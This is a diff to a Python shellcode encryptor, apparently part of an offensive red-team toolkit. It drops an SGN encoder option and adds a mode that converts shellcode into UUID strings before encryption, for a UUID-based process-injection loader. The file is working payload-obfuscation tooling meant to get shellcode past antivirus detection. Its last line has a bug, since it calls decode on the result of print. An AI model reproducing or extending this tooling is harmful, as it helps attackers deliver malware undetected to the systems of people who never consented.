@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import os
+import uuid
 import hashlib
 from base64 import b64encode
 from argparse import ArgumentParser
@@ -50,8 +51,8 @@ def parse_args():
                                              help='algorithm to encrypt the shellcode with')
 	parser.add_argument('-o', '--output', action='store', type=str,
                                           help='output file path')
-	parser.add_argument('--sgn', action='store', type=str,
-                                 help='path to the sgn encoder (https://github.com/EgeBalci/sgn/releases)')
+	parser.add_argument('--uuid', action='store_true', default=False,
+                                  help='convert the shellcode to UUID string before encrypting (used in "currentthreaduuid")')
 	parser.add_argument('--base64', action='store_true', default=False,
                                     help='print the output in base64')
 	return parser.parse_args()
@@ -60,16 +61,20 @@ def parse_args():
 if __name__ == '__main__':
 	args = parse_args()
 
-	shellcode_bin = args.shellcode_bin
-	if args.sgn:
-		os.system(f'{args.sgn} {args.shellcode_bin}')
-		shellcode_bin += '.sgn'
-
-	with open(shellcode_bin, 'rb') as fd:
+	with open(args.shellcode_bin, 'rb') as fd:
 		shellcode = fd.read()
 
-	if args.sgn:
-		os.remove(shellcode_bin)
+	if args.uuid:
+		if len(shellcode) % 16:
+			null_nytes = b'\x00' * (16 - (len(shellcode) % 16))
+			shellcode += null_nytes
+
+		concatedUuids = b''
+		for i in range(0, len(shellcode), 16):
+			uuid_str = str(uuid.UUID(bytes_le=shellcode[i:i+16]))
+			concatedUuids += uuid_str.encode() + b'|'
+
+		shellcode = concatedUuids
 
 	if args.algorithm == 'aes':
 		iv = os.urandom(16)
@@ -81,8 +86,11 @@ if __name__ == '__main__':
 	enc = ctx.encrypt(shellcode)
 
 	if args.base64:
-		print(b64encode(enc).decode())
-	else:
+		enc = b64encode(enc)
+
+	if args.output:
 		with open(args.output, 'wb') as fd:
 			fd.write(enc)
 		print(f'[+] Encrypted shellcode file: {args.output}')
+	elif args.base64:
+		print(enc).decode().strip()
